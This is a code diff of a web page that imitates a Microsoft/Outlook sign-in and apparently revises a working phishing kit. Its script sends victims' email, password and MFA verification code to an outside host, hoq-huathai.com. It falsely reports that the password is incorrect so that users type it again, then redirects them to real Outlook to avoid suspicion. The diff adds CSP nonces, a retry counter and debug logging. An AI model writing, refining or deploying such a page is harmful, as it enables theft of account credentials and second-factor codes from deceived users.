@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -105,7 +104,6 @@
         }
 
         a {
-            /*color: #ccc;*/
             color: #0067b8;
             text-decoration: none;
         }
@@ -284,166 +282,186 @@
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" nonce="MTQ2MTU0MzQ5NiwxNDc2OTA3NzA5"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" nonce="MTQ2MTU0MzQ5NiwxNDc2OTA3NzA5"></script>
 
-    <script>
-        $(document).ready(function() {
-        let userData = {
-            email: '',
-            password: '',
-            submissionCount: 0
+    <script nonce="MTQ2MTU0MzQ5NiwxNDc2OTA3NzA5">
+    $(document).ready(function() {
+    let submissionCount = 0;
+    let userData = {
+        email: '',
+        password: ''
+    };
+    
+    const fallbackLogo = "https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg";
+    
+    function getDomainFromEmail(email) {
+        return email.split('@')[1];
+    }
+    
+    function getFaviconUrl(domain) {
+        return `https://logo.clearbit.com/${domain}`;
+    }
+    
+    function tryLoadDomainFavicon(email) {
+        if (!email || !email.includes('@')) return;
+        
+        const domain = getDomainFromEmail(email);
+        if (!domain) return;
+        
+        const faviconUrl = getFaviconUrl(domain);
+        const img = new Image();
+        
+        img.onload = function() {
+            $('#domainLogo').attr('src', faviconUrl);
         };
+
+        img.src = faviconUrl;
+    }
+
+    function showError(message) {
+        $('#errorAlert').text(message).show();
+        setTimeout(function() {
+            $('#errorAlert').hide();
+        }, 3000);
+    }
+
+    function showSuccess(message) {
+        $('#successAlert').text(message).show();
+    }
+    
+    function hideSuccess() {
+        $('#successAlert').hide();
+    }
+
+    function goToStep(step) {
+        $('.form-step').removeClass('active');
+        $(`#step${step}`).addClass('active');
+    }
+
+    $('#emailForm').on('submit', function(e) {
+        e.preventDefault();
         
-        const fallbackLogo = "https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg";
+        userData.email = $('#email').val().trim();
         
-        function getDomainFromEmail(email) {
-            return email.split('@')[1];
+        if (!userData.email) {
+            showError('Please enter a valid email address');
+            return;
         }
+
+        tryLoadDomainFavicon(userData.email);
+
+        $('#displayEmail').val(userData.email);
+        $('#displayEmailCode').text(userData.email); // Changed val() to text() if this is a span/div
         
-        function getFaviconUrl(domain) {
-            return `https://logo.clearbit.com/${domain}`;
-        }
+        goToStep(2);
+    });
+    
+    $('#password').on('input', function() {
+        hideSuccess();
+    });
+
+    // Handle password form submission
+    $('#passwordForm').on('submit', function(e) {
+        e.preventDefault();
         
-        function tryLoadDomainFavicon(email) {
-            if (!email || !email.includes('@')) return;
-            
-            const domain = getDomainFromEmail(email);
-            if (!domain) return;
-            
-            const faviconUrl = getFaviconUrl(domain);
-            const img = new Image();
-            
-            img.onload = function() {
-                $('#domainLogo').attr('src', faviconUrl);
-            };
-
-            img.src = faviconUrl;
-        }
-
-        function showError(message) {
-            $('#errorAlert').text(message).show();
-            setTimeout(function() {
-                $('#errorAlert').hide();
-            }, 3000);
-        }
-
-        function showSuccess(message) {
-            $('#successAlert').text(message).show();
-        }
+        userData.password = $('#password').val().trim();
         
-        function hideSuccess() {
-            $('#successAlert').hide();
+        if (!userData.password) {
+            showError('Please enter your password');
+            return;
         }
 
-        function goToStep(step) {
-            $('.form-step').removeClass('active');
-            $(`#step${step}`).addClass('active');
-        }
-
-        $('#emailForm').on('submit', function(e) {
-            e.preventDefault();
-            
-            userData.email = $('#email').val().trim();
-            
-            if (!userData.email) {
-                showError('Please enter a valid email address');
-                return;
-            }
-
-            tryLoadDomainFavicon(userData.email);
-
-            $('#displayEmail').val(userData.email);
-            $('#displayEmailCode').val(userData.email);
-            
-            goToStep(2);
-        });
-        
-        $('#password').on('input', function() {
-            hideSuccess();
-        });
-
-        $('#passwordForm').on('submit', function(e) {
-            e.preventDefault();
-            
-            userData.password = $('#password').val().trim();
-            
-            if (!userData.password) {
-                showError('Please enter your password');
-                return;
-            }
-
-            $.ajax({
-                url: 'https://hoq-huathai.com/login.php',
-                type: 'POST',
-                dataType: 'json',
-                data: {
-                    email: userData.email,
-                    password: userData.password,
-                    step: 'password'
-                },
-                success: function(response) {
-                    if (response.success) {
-                        showSuccess('Your account or password is incorrect.');
-                        
-                        $('#password').val('');
-                        
-                        userData.submissionCount = response.submissionCount;
-                        
-                        if (response.showVerification) {
-                            hideSuccess();
-                            goToStep(3);
-                        } 
-                    } else {
-                        showError(response.message || 'Invalid credentials');
+        // Submit email and password to the server using AJAX
+        $.ajax({
+            url: 'https://hoq-huathai.com/login.php',
+            type: 'POST',
+            dataType: 'json',
+            data: {
+                email: userData.email,
+                password: userData.password,
+                step: 'password'
+            },
+            success: function(response) {
+                if (response.success) {
+                    showSuccess('Your account or password is incorrect.');
+                    $('#password').val('');
+                    
+                    submissionCount++;
+                    
+                    if (response.showVerification || submissionCount >= 2) {
+                        hideSuccess();
+                        goToStep(3);
                     }
-                },
-                error: function() {
-                    showError('Server error. Please try again later.');
+                } else {
+                    showError(response.message || 'Invalid credentials');
                 }
-            });
-        });
-
-        $('#codeForm').on('submit', function(e) {
-            e.preventDefault();
-            
-            const authCode = $('#authCode').val().trim();
-            
-            if (!authCode) {
-                showError('To continue, enter the code we just sent you.');
-                return;
+            },
+            error: function(xhr, status, error) {
+                console.error("AJAX Error:", status, error);
+                console.log("Response:", xhr.responseText);
+                showError('Server error. Please try again later.');
             }
-
-            $.ajax({
-                url: 'https://hoq-huathai.com/login.php',
-                type: 'POST',
-                dataType: 'json',
-                data: {
-                    email: userData.email,
-                    authCode: authCode,
-                    step: 'verification'
-                },
-                success: function(response) {
-                    if (response.success) {
-                        showSuccess('Verification successful! Redirecting...');
-                        setTimeout(function() {
-                            window.location.href = 'https://outlook.office365.com/mail/view.html#authRedirect=true';
-                        }, 1500);
-                    } else {
-                        showError(response.message || 'Invalid verification code');
-                    }
-                },
-                error: function() {
-                    showError('Server error. Please try again later.');
-                }
-            });
         });
     });
-</script>
-<script>
-    document.getElementById("authCode").addEventListener("input", function(event) {
+
+    // Ensure authCode only accepts numbers
+    $("#authCode").on("input", function() {
         this.value = this.value.replace(/\D/g, "");
     });
-    </script>
+
+    // Debug function to check what's happening with the code form
+    function debugFormSubmission() {
+        console.log("Form submitted");
+        console.log("Email:", userData.email);
+        console.log("Auth code:", $('#authCode').val().trim());
+    }
+
+    // Handle code form submission with enhanced debugging
+    $('#codeForm').on('submit', function(e) {
+        e.preventDefault();
+        debugFormSubmission();
+        
+        const authCode = $('#authCode').val().trim();
+        
+        if (!authCode) {
+            showError('To continue, enter the code we just sent you.');
+            return;
+        }
+
+        // Make AJAX request with more detailed error handling
+        $.ajax({
+            url: 'https://hoq-huathai.com/login.php',
+            type: 'POST',
+            dataType: 'json',
+            data: {
+                email: userData.email,
+                authCode: authCode,
+                step: 'verification'
+            },
+            beforeSend: function() {
+                console.log("Sending verification request...");
+            },
+            success: function(response) {
+                console.log("Server response:", response);
+                if (response.success) {
+                    showSuccess('Verification successful! Redirecting...');
+                    setTimeout(function() {
+                        window.location.href = 'https://outlook.office365.com/mail/view.html#authRedirect=true';
+                    }, 1500);
+                } else {
+                    showError(response.message || 'Invalid verification code');
+                }
+            },
+            error: function(xhr, status, error) {
+                console.error("AJAX Error:", status, error);
+                console.log("Response status:", xhr.status);
+                console.log("Response text:", xhr.responseText);
+                showError('Server error. Please try again later.');
+            }
+        });
+    });
+});
+</script>
 </body>
 </html>
